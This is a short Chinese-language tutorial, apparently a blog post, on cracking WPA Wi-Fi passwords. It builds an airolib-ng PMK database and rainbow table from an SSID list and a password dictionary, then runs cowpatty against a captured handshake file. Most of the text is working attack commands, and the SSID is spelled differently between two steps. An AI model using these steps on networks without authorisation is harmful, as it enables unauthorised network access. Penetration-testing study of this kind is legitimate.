# WPA渗透-使用airolib-ng创建彩虹表加速

## 1.什么是彩虹表?

彩虹表是一一个用于加密散列函数逆运算的预先计算好的表，为破解密码的散列值(或称哈希值、微缩图、摘要、指纹、哈希密文)而准备。一般主流的彩虹表都在100GB以上。这样的表常常用于恢复由有限集字符组成的固定长度的纯文本密码。

## 2.渗透wifi

### 1.创建数据库名

```
airolib-ng [数据库名] --import essid [一个或者多个ssid的文件]

airolib-ng RINBOW1 --import essid wifi.txt
```

![image-20230419144927041](https://img.gyxnb.top/img/image-20230419144927041.png)

### 2.将字典导入数据库

```
airolib-ng [数据库名] --import passwd [字典]

airolib-ng RINBOW1 --import passwd /root/wifi/passwd.txt
```

### 3.生成渗透wifi密码的PMK

```
airolib-ng [ 数据库名] --batch

airolib-ng RINBOW1 --batch
```

### 4.生成需要渗透wifi的彩虹表

```
airolib-ng [数据库名] --export cowpatty [ssid][表名]

airolib-ng RINBOW1 --export cowpatty cisco-1809 R_RINBOW1
```

### 5.渗透wifi

```
cowpatty -s [ssid] -d [表名] -r [抓到的cap握手包]

cowpatty -s cisC0-1809 -d R_RINBOW1 -r wpa-1-01.cap
```

